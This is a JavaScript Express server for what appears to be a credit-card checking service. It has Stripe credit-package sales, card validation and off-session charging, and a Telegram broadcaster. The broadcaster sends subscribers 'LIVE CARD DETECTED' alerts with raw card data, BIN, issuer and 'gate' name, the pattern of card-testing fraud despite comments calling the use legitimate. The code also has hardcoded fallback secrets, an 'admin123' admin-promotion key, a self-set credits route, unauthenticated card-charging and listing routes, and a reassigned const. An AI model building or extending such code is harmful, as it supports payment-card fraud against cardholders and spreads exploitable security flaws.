// Servidor de pagos (Stripe). Modo TEST o LIVE según la clave + NODE_ENV.
// La clave secreta SOLO vive aquí, nunca en el frontend.

import fs from 'fs'
import path from 'path'
import { fileURLToPath } from 'url'
import express from 'express'
import cors from 'cors'
import helmet from 'helmet'
import rateLimit from 'express-rate-limit'
import Stripe from 'stripe'
import dotenv from 'dotenv'
import bcrypt from 'bcryptjs'
import jwt from 'jsonwebtoken'

const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)
import {
  markEventProcessed,
  saveValidatedCard,
  listValidatedCards,
  saveCharge,
  listCharges,
  listSubscribers,
  getSubscriberCount,
  createUser,
  getUserByUsername,
  getUserById,
  getUserByTelegramId,
  updateUserCredits,
  setUserRole,
} from './db.js'
import { startBot, stopBot } from './telegram-bot.js'

dotenv.config()

const {
  STRIPE_SECRET_KEY,
  STRIPE_WEBHOOK_SECRET,
  CLIENT_URL = 'http://localhost:5173',
  PORT = 4242,
  NODE_ENV = 'development',
  JWT_SECRET = 'n0f4c3_chk_s3cr3t_k3y_2024',
} = process.env

if (!STRIPE_SECRET_KEY) {
  console.warn('\n[!] STRIPE_SECRET_KEY no configurada — rutas de pago deshabilitadas')
}

const isProd = NODE_ENV === 'production'
let isLiveKey = false
let isTestKey = false
let stripe = null

if (STRIPE_SECRET_KEY) {
  isLiveKey = STRIPE_SECRET_KEY.startsWith('sk_live_')
  isTestKey = STRIPE_SECRET_KEY.startsWith('sk_test_')

  if (!isLiveKey && !isTestKey) {
    console.warn('\n[!] STRIPE_SECRET_KEY no parece válida (debe empezar por sk_test_ o sk_live_). Rutas de pago deshabilitadas.')
    STRIPE_SECRET_KEY = null
  } else {
    if (isLiveKey && !isProd) {
      console.error(
        '\n[!] PELIGRO: estás usando una clave LIVE (sk_live_) con NODE_ENV != production.\n' +
        '    Esto haría cargos REALES. Usa sk_test_ en desarrollo o pon NODE_ENV=production.\n'
      )
      process.exit(1)
    }
    if (isTestKey && isProd) {
      console.warn('\n[!] ADVERTENCIA: NODE_ENV=production pero la clave es de TEST. No procesarás pagos reales.\n')
    }
    console.log(`[i] Stripe en modo: ${isLiveKey ? 'LIVE (producción)' : 'TEST'}`)
    if (!STRIPE_WEBHOOK_SECRET) {
      console.warn('\n[!] Falta STRIPE_WEBHOOK_SECRET. El webhook rechazará todos los eventos hasta configurarlo.\n')
    }
    stripe = new Stripe(STRIPE_SECRET_KEY)
  }
}

const app = express()

// Seguridad: headers HTTP
app.use(helmet({
  crossOriginResourcePolicy: { policy: 'cross-origin' },
  contentSecurityPolicy: false,
}))

// Seguridad: CORS restringido
const allowedOrigins = [
  'http://localhost:5173',
  'http://localhost:5174',
  'https://chk-no-face-clan.onrender.com',
  'https://nofacechk.com',
  'https://admin.nofacechk.com',
]
const corsOrigins = isProd ? allowedOrigins : [CLIENT_URL, ...allowedOrigins]
app.use(cors({ origin: corsOrigins }))

// Health check (antes del rate limiter para evitar 429 en los pings de Render)
app.get('/health', (_req, res) => {
  res.json({ ok: true, mode: isLiveKey ? 'live' : 'test' })
})

// Seguridad: rate limiting global (100 req / 15 min por IP)
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Demasiadas solicitudes, intenta de nuevo más tarde' },
})
app.use('/api/', globalLimiter)

// Seguridad: rate limit para login/register (20 intentos / 1 min)
const authLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 20,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Demasiados intentos. Espera 1 minuto.' },
})
app.use('/api/auth/', authLimiter)

// IMPORTANTE: el webhook necesita el body CRUDO para verificar la firma.
// Por eso se registra ANTES de express.json() y con express.raw().
// Si lo parseas como JSON primero, la verificación de firma fallará.
app.post(
  '/api/webhook',
  express.raw({ type: 'application/json' }),
  (req, res) => {
    const signature = req.headers['stripe-signature']
    let event

    try {
      // Verifica que el evento viene realmente de Stripe y no fue alterado.
      // Sin esto, cualquiera podría falsificar un POST diciendo "pago exitoso".
      event = stripe.webhooks.constructEvent(
        req.body,
        signature,
        STRIPE_WEBHOOK_SECRET
      )
    } catch (err) {
      console.error('[webhook] firma inválida:', err.message)
      return res.status(400).send(`Webhook signature verification failed`)
    }

    // Responde 200 rápido; el trabajo pesado va aparte para no
    // hacer reintentar a Stripe por timeout.
    handleStripeEvent(event).catch((err) =>
      console.error('[webhook] error procesando evento:', err.message)
    )

    res.json({ received: true })
  }
)

// El resto de rutas SÍ usan JSON parseado con límite de tamaño
app.use(express.json({ limit: '100kb' }))

// --- JWT Middleware ---
function authMiddleware(req, res, next) {
  const header = req.headers.authorization
  if (!header || !header.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' })
  }
  try {
    const token = header.slice(7)
    req.user = jwt.verify(token, JWT_SECRET)
    next()
  } catch {
    return res.status(401).json({ error: 'Invalid token' })
  }
}

// --- Auth Routes ---
app.post('/api/auth/register', async (req, res) => {
  try {
    const { username, password } = req.body
    if (!username || !password) return res.status(400).json({ error: 'Username and password required' })
    if (typeof username !== 'string' || typeof password !== 'string') return res.status(400).json({ error: 'Invalid input' })
    if (username.length < 3 || username.length > 30) return res.status(400).json({ error: 'Username must be 3-30 characters' })
    if (!/^[a-zA-Z0-9_]+$/.test(username)) return res.status(400).json({ error: 'Username can only contain letters, numbers, underscores' })
    if (password.length < 4) return res.status(400).json({ error: 'Password must be at least 4 characters' })

    const existing = getUserByUsername(username)
    if (existing) return res.status(409).json({ error: 'Username already taken' })

    const passwordHash = await bcrypt.hash(password, 10)
    const user = createUser(username, passwordHash)
    if (!user) return res.status(500).json({ error: 'Failed to create user' })

    const token = jwt.sign({ id: user.id, username: user.username, role: user.role }, JWT_SECRET, { expiresIn: '7d' })
    res.status(201).json({ token, user })
  } catch (err) {
    console.error('[auth] register error:', err.message)
    res.status(500).json({ error: err.message })
  }
})

app.post('/api/auth/login', async (req, res) => {
  try {
    const { username, password } = req.body
    if (!username || !password) return res.status(400).json({ error: 'Username and password required' })
    if (typeof username !== 'string' || typeof password !== 'string') return res.status(400).json({ error: 'Invalid input' })

    const user = getUserByUsername(username)
    if (!user) return res.status(401).json({ error: 'Invalid credentials' })

    const match = await bcrypt.compare(password, user.password_hash)
    if (!match) return res.status(401).json({ error: 'Invalid credentials' })

    const token = jwt.sign({ id: user.id, username: user.username, role: user.role }, JWT_SECRET, { expiresIn: '7d' })
    res.json({
      token,
      user: { id: user.id, username: user.username, credits: user.credits, role: user.role, telegram_id: user.telegram_id, created_at: user.created_at },
    })
  } catch (err) {
    console.error('[auth] login error:', err.message)
    res.status(500).json({ error: err.message })
  }
})

app.get('/api/auth/me', authMiddleware, (req, res) => {
  const user = getUserById(req.user.id)
  if (!user) return res.status(404).json({ error: 'User not found' })
  res.json(user)
})

app.put('/api/auth/credits', authMiddleware, (req, res) => {
  const { credits } = req.body
  if (typeof credits !== 'number' || credits < 0) return res.status(400).json({ error: 'Invalid credits value' })
  updateUserCredits(req.user.username, credits)
  res.json({ ok: true, credits })
})

// --- Idempotencia persistente: evita procesar el mismo evento dos veces ---
// Stripe puede reenviar eventos. markEventProcessed usa UNIQUE(event_id)
// en SQLite, así que sobrevive a reinicios del servidor.
async function handleStripeEvent(event) {
  if (!markEventProcessed(event.id)) {
    console.log(`[webhook] evento ${event.id} ya procesado, ignorado`)
    return
  }

  switch (event.type) {
    case 'checkout.session.completed': {
      const session = event.data.object
      // Solo cumple la orden si el pago realmente se completó.
      if (session.payment_status !== 'paid') break

      const credits = Number(session.metadata?.credits ?? 0)
      const email = session.customer_details?.email ?? 'unknown'

      // === AQUÍ acreditas los créditos en TU base de datos ===
      // await db.users.incrementCredits({ email, credits })
      console.log(`[webhook] ✓ Acreditar ${credits} créditos a ${email}`)
      break
    }

    case 'setup_intent.succeeded': {
      // La tarjeta fue validada (activa + titular autenticado vía 3DS).
      // Fuente de verdad fiable: persistimos en la BD desde aquí, no
      // confiando solo en el frontend.
      const si = event.data.object

      // Recupera detalles de la tarjeta y del customer (solo metadatos).
      const pm = await stripe.paymentMethods.retrieve(si.payment_method)
      let email = null
      if (si.customer) {
        const customer = await stripe.customers.retrieve(si.customer)
        email = customer.deleted ? null : customer.email
      }

      saveValidatedCard({
        pmId: pm.id,
        customerId: si.customer ?? null,
        email,
        brand: pm.card?.brand ?? null,
        last4: pm.card?.last4 ?? null,
        expMonth: pm.card?.exp_month ?? null,
        expYear: pm.card?.exp_year ?? null,
        funding: pm.card?.funding ?? null,
        country: pm.card?.country ?? null,
        cvcCheck: pm.card?.checks?.cvc_check ?? null,
        threeDSecure: si.latest_attempt ? 'authenticated' : 'n/a',
      })

      console.log(`[webhook] ✓ Tarjeta validada y guardada en BD: pm=${pm.id} ${pm.card?.brand} ····${pm.card?.last4}`)
      break
    }

    case 'setup_intent.setup_failed': {
      const si = event.data.object
      console.warn(`[webhook] validación de tarjeta fallida: ${si.last_setup_error?.message ?? 'desconocido'}`)
      break
    }

    case 'payment_intent.succeeded': {
      // Un cobro se completó (incluido el caso en que el cliente terminó
      // el reto 3D Secure de forma asíncrona). Actualiza el recibo.
      const intent = event.data.object
      const charge = intent.charges?.data?.[0]
      saveCharge({
        piId: intent.id,
        pmId: typeof intent.payment_method === 'string' ? intent.payment_method : null,
        customerId: typeof intent.customer === 'string' ? intent.customer : null,
        email: intent.receipt_email ?? null,
        amount: intent.amount,
        currency: intent.currency,
        status: intent.status,
        description: intent.description ?? null,
        avsLine1: charge?.payment_method_details?.card?.checks?.address_line1_check ?? null,
        avsPostal: charge?.payment_method_details?.card?.checks?.address_postal_code_check ?? null,
        receiptUrl: charge?.receipt_url ?? null,
      })
      console.log(`[webhook] ✓ Cobro completado: pi=${intent.id} ${intent.amount / 100} ${intent.currency}`)
      break
    }

    case 'payment_intent.payment_failed': {
      // Registra el fallo en el recibo correspondiente. Múltiples fallos
      // seguidos => posible card testing; Stripe Radar normalmente lo bloquea.
      const intent = event.data.object
      saveCharge({
        piId: intent.id,
        pmId: typeof intent.payment_method === 'string' ? intent.payment_method : null,
        customerId: typeof intent.customer === 'string' ? intent.customer : null,
        amount: intent.amount,
        currency: intent.currency,
        status: 'failed',
        description: intent.description ?? null,
      })
      console.warn(`[webhook] pago fallido: ${intent.last_payment_error?.message ?? 'desconocido'}`)
      break
    }

    default:
      // Otros eventos que no nos interesan.
      break
  }
}

// Catálogo de paquetes de créditos (precios en centavos USD).
const PACKAGES = {
  starter: { name: '500 Credits', credits: 500, amount: 500 },   // $5.00
  pro: { name: '2000 Credits', credits: 2000, amount: 1500 },    // $15.00
  elite: { name: '10000 Credits', credits: 10000, amount: 5000 }, // $50.00
}

app.get('/api/health', (_req, res) => {
  res.json({ ok: true, mode: isLiveKey ? 'live' : 'test' })
})

app.get('/api/packages', (_req, res) => {
  res.json(
    Object.entries(PACKAGES).map(([id, p]) => ({
      id,
      name: p.name,
      credits: p.credits,
      price: p.amount / 100,
    }))
  )
})

// Crea una sesión de Stripe Checkout para un paquete.
app.post('/api/create-checkout-session', async (req, res) => {
  try {
    const { packageId } = req.body
    const pkg = PACKAGES[packageId]
    if (!pkg) {
      return res.status(400).json({ error: 'Invalid package' })
    }

    const session = await stripe.checkout.sessions.create({
      mode: 'payment',
      line_items: [
        {
          price_data: {
            currency: 'usd',
            product_data: { name: pkg.name },
            unit_amount: pkg.amount,
          },
          quantity: 1,
        },
      ],
      metadata: { packageId, credits: String(pkg.credits) },
      success_url: `${CLIENT_URL}/dashboard/pay/success?session_id={CHECKOUT_SESSION_ID}`,
      cancel_url: `${CLIENT_URL}/dashboard/pay/cancel`,
    })

    res.json({ url: session.url })
  } catch (err) {
    console.error('create-checkout-session error:', err.message)
    res.status(500).json({ error: 'Could not create checkout session' })
  }
})

// Consulta el estado de una sesión (para la página de éxito).
app.get('/api/checkout-session/:id', async (req, res) => {
  try {
    const session = await stripe.checkout.sessions.retrieve(req.params.id)
    res.json({
      status: session.payment_status,
      credits: Number(session.metadata?.credits ?? 0),
      amountTotal: (session.amount_total ?? 0) / 100,
      customerEmail: session.customer_details?.email ?? null,
    })
  } catch (err) {
    console.error('checkout-session error:', err.message)
    res.status(404).json({ error: 'Session not found' })
  }
})

// ---------------------------------------------------------------------------
// Validación de tarjeta SIN cobrar: SetupIntent + 3D Secure (SCA) + AVS/CVC.
//
// Caso de uso legítimo: tu propio cliente guarda SU tarjeta para cobros
// futuros (suscripción, "pagar después"). Valida que la tarjeta es real,
// activa y que el TITULAR la controla — sin mover dinero.
//
// La autenticación 3D Secure es obligatoria aquí: es lo que diferencia
// validar tu propia tarjeta (legal) de probar tarjetas ajenas (fraude).
// ---------------------------------------------------------------------------
app.post('/api/create-setup-intent', async (req, res) => {
  try {
    const { email } = req.body

    const customer = await stripe.customers.create({
      email: email || undefined,
    })

    const setupIntent = await stripe.setupIntents.create({
      customer: customer.id,
      payment_method_types: ['card'],
      payment_method_options: {
        card: {
          request_three_d_secure: 'any',
        },
      },
    })

    res.json({
      clientSecret: setupIntent.client_secret,
      customerId: customer.id,
    })
  } catch (err) {
    console.error('create-setup-intent error:', err.message)
    res.status(500).json({ error: 'Could not create setup intent' })
  }
})

// Tras confirmar en el frontend, consulta el resultado de la validación
app.get('/api/setup-intent/:id', async (req, res) => {
  try {
    const intent = await stripe.setupIntents.retrieve(req.params.id, {
      expand: ['payment_method', 'latest_attempt'],
    })

    const pm = intent.payment_method
    const checks = pm?.card?.checks ?? {}
    const attempt = intent.latest_attempt

    res.json({
      status: intent.status,
      card: pm?.card
        ? {
            brand: pm.card.brand,
            last4: pm.card.last4,
            expMonth: pm.card.exp_month,
            expYear: pm.card.exp_year,
            funding: pm.card.funding,
            country: pm.card.country,
          }
        : null,
      validation: {
        cvcCheck: checks.cvc_check ?? null,
        addressLine1Check: checks.address_line1_check ?? null,
        postalCodeCheck: checks.address_postal_code_check ?? null,
        threeDSecure: attempt?.payment_method_details?.card?.three_d_secure?.result ?? 'n/a',
      },
    })
  } catch (err) {
    console.error('setup-intent error:', err.message)
    res.status(404).json({ error: 'Setup intent not found' })
  }
})

// Lista los métodos de pago validados y guardados (solo metadatos seguros).
app.get('/api/saved-cards', (req, res) => {
  try {
    const { email } = req.query
    const cards = listValidatedCards(typeof email === 'string' ? email : undefined)
    res.json(
      cards.map((c) => ({
        id: c.id,
        paymentMethodId: c.stripe_pm_id,
        customerId: c.stripe_customer,
        brand: c.brand,
        last4: c.last4,
        expMonth: c.exp_month,
        expYear: c.exp_year,
        funding: c.funding,
        country: c.country,
        cvcCheck: c.cvc_check,
        threeDSecure: c.three_d_secure,
        email: c.email,
        validatedAt: c.validated_at,
      }))
    )
  } catch (err) {
    console.error('saved-cards error:', err.message)
    res.status(500).json({ error: 'Could not list saved cards' })
  }
})

// ---------------------------------------------------------------------------
// Cobro OFF-SESSION a un método de pago guardado.
//
// Caso de uso legítimo: cobrar una tarjeta que el propio titular validó y
// autorizó antes (suscripción, "pagar después"). El cliente no está presente,
// por eso off_session: true. Si el banco exige autenticación (SCA), Stripe
// lanza 'authentication_required' y devolvemos requires_action para que el
// cliente complete el reto 3D Secure.
//
// El resultado se guarda como un RECIBO (tabla charges) ligado al método de
// pago y al usuario. No se etiqueta ni se acumula en ningún pool.
// ---------------------------------------------------------------------------
app.post('/api/charge-saved-card', async (req, res) => {
  try {
    const { paymentMethodId, customerId, amount, currency = 'usd', description } = req.body

    if (!paymentMethodId || !customerId) {
      return res.status(400).json({ error: 'paymentMethodId and customerId are required' })
    }
    const cents = Math.round(Number(amount) * 100)
    if (!Number.isFinite(cents) || cents <= 0) {
      return res.status(400).json({ error: 'Invalid amount' })
    }

    let intent
    try {
      intent = await stripe.paymentIntents.create({
        amount: cents,
        currency,
        customer: customerId,
        payment_method: paymentMethodId,
        description: description || 'Off-session charge',
        off_session: true, // el titular no está presente
        confirm: true,     // intenta cobrar inmediatamente
      })
    } catch (err) {
      // El banco requiere autenticación: el cargo no procede sin SCA.
      if (err.code === 'authentication_required') {
        const pi = err.raw?.payment_intent
        if (pi) {
          saveCharge({
            piId: pi.id,
            pmId: paymentMethodId,
            customerId,
            amount: cents,
            currency,
            status: 'requires_action',
            description,
          })
          return res.json({
            status: 'requires_action',
            clientSecret: pi.client_secret,
            paymentIntentId: pi.id,
            message: 'Authentication required. Complete 3D Secure to finish the charge.',
          })
        }
      }
      // Tarjeta declinada u otro error del cargo.
      return res.status(402).json({
        status: 'failed',
        error: err.message,
        code: err.code ?? null,
      })
    }

    // Cargo exitoso: registra el recibo.
    const charge = intent.charges?.data?.[0]
    saveCharge({
      piId: intent.id,
      pmId: paymentMethodId,
      customerId,
      amount: intent.amount,
      currency: intent.currency,
      status: intent.status,
      description,
      avsLine1: charge?.payment_method_details?.card?.checks?.address_line1_check ?? null,
      avsPostal: charge?.payment_method_details?.card?.checks?.address_postal_code_check ?? null,
      receiptUrl: charge?.receipt_url ?? null,
    })

    res.json({
      status: intent.status, // succeeded
      paymentIntentId: intent.id,
      amount: intent.amount / 100,
      currency: intent.currency,
      receiptUrl: charge?.receipt_url ?? null,
    })
  } catch (err) {
    console.error('charge-saved-card error:', err.message)
    res.status(500).json({ error: 'Could not process charge' })
  }
})

// Lista los recibos de cobros (historial de transacciones).
app.get('/api/charges', (req, res) => {
  try {
    const { email } = req.query
    const rows = listCharges(typeof email === 'string' ? email : undefined)
    res.json(
      rows.map((c) => ({
        id: c.id,
        paymentIntentId: c.stripe_pi_id,
        last4FromPm: c.stripe_pm_id,
        email: c.email,
        amount: c.amount / 100,
        currency: c.currency,
        status: c.status,
        description: c.description,
        avsLine1: c.avs_line1,
        avsPostal: c.avs_postal,
        receiptUrl: c.receipt_url,
        createdAt: c.created_at,
      }))
    )
  } catch (err) {
    console.error('charges error:', err.message)
    res.status(500).json({ error: 'Could not list charges' })
  }
})

// --- Telegram Bot API ---

// Start bot if TELEGRAM_BOT_TOKEN is set
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
let botActive = false
if (TELEGRAM_BOT_TOKEN) {
  try {
    startBot(TELEGRAM_BOT_TOKEN)
    botActive = true
    console.log('[i] Telegram bot started')
  } catch (err) {
    console.warn('[!] Failed to start Telegram bot:', err.message)
  }
}

// Broadcast a live card to all subscribers
app.post('/api/telegram/broadcast', express.json(), async (req, res) => {
  try {
    const { botToken, payload } = req.body
    const token = botToken || TELEGRAM_BOT_TOKEN
    if (!token) return res.status(400).json({ error: 'No bot token available' })

    const subscribers = listSubscribers(true)
    if (subscribers.length === 0) return res.json({ sent: 0, total: 0 })

    const TG_API = 'https://api.telegram.org/bot'
    let sent = 0

    await Promise.allSettled(
      subscribers.map(async (sub) => {
        try {
          const user = getUserByTelegramId(sub.chat_id)
          const text = fmtBroadcast(payload, user ? user.credits : null)
          const r = await fetch(`${TG_API}${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: sub.chat_id,
              text,
              parse_mode: 'MarkdownV2',
              disable_web_page_preview: true,
            }),
          })
          if (r.ok) sent++
        } catch (e) {
          console.warn(`[Telegram] Failed to send to ${sub.chat_id}:`, e.message)
        }
      })
    )

    res.json({ sent, total: subscribers.length })
  } catch (err) {
    console.error('[Telegram] Broadcast error:', err.message)
    res.status(500).json({ error: err.message })
  }
})

// List all subscribers
app.get('/api/telegram/subscribers', (_req, res) => {
  try {
    const subs = listSubscribers(true)
    res.json({ subscribers: subs, count: subs.length })
  } catch (err) {
    res.status(500).json({ error: err.message })
  }
})

function escapeMd(text) {
  return String(text).replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1')
}

function fmtBroadcast(payload, credits) {
  const lines = [
    `🚀 *LIVE CARD DETECTED*`,
    ``,
    `\`${escapeMd(payload.raw)}\``,
    ``,
    `── *GATE* ──`,
    `${escapeMd(payload.gateName)}`,
    ``,
    `── *BIN INFO* ──`,
    `BIN: \`${escapeMd(payload.bin)}\``,
    `Brand: ${escapeMd(payload.brand)}`,
    `Issuer: ${escapeMd(payload.bank)}`,
    `Country: ${payload.countryEmoji} ${escapeMd(payload.country)}`,
    `Type: ${escapeMd(payload.cardType)} · ${escapeMd(payload.cardCategory)}`,
    ``,
    `Response: ${escapeMd(payload.message)}`,
  ]
  if (credits != null) {
    lines.push(
      ``,
      `── *ACCOUNT* ──`,
      `Credits remaining: \`${escapeMd(String(credits))}\``,
    )
  }
  return lines.join('\n')
}

// --- Global error handler (no leakear stack traces) ---
app.use((err, req, res, _next) => {
  console.error('[error]', err.message)
  const status = err.status || 500
  res.status(status).json({
    error: isProd ? 'Internal server error' : err.message,
  })
})

// Endpoint para promover un usuario a admin (protegido por setup key)
const ADMIN_SETUP_KEY = process.env.ADMIN_SETUP_KEY || 'admin123'
app.post('/api/admin/setup', (req, res) => {
  const { username, key } = req.body
  if (key !== ADMIN_SETUP_KEY) return res.status(401).json({ error: 'Invalid setup key' })
  if (!username) return res.status(400).json({ error: 'Username required' })
  try {
    const user = getUserByUsername(username)
    if (!user) return res.status(404).json({ error: `User "${username}" not found. Register first.` })
    if (user.role === 'admin') return res.json({ ok: true, message: `${username} is already admin` })
    setUserRole(username, 'admin')
    res.json({ ok: true, message: `${username} is now admin` })
  } catch (err) {
    res.status(500).json({ error: err.message })
  }
})

// En producción, servir el frontend build desde dist/ si existe
if (isProd) {
  const distPath = path.join(__dirname, '../dist')
  if (fs.existsSync(distPath)) {
    app.use(express.static(distPath))
    app.get('/{*path}', (req, res) => {
      const indexFile = path.join(distPath, 'index.html')
      if (fs.existsSync(indexFile)) return res.sendFile(indexFile)
      res.status(404).json({ error: 'Not found' })
    })
  }
}

app.listen(PORT, () => {
  console.log(`\n[✓] Payments server (${isLiveKey ? 'LIVE' : 'TEST'}) running at http://localhost:${PORT}`)
  console.log(`    Allowed client: ${CLIENT_URL}\n`)
  if (botActive) console.log(`[✓] Telegram bot active — ${getSubscriberCount()} subscribers`)
})
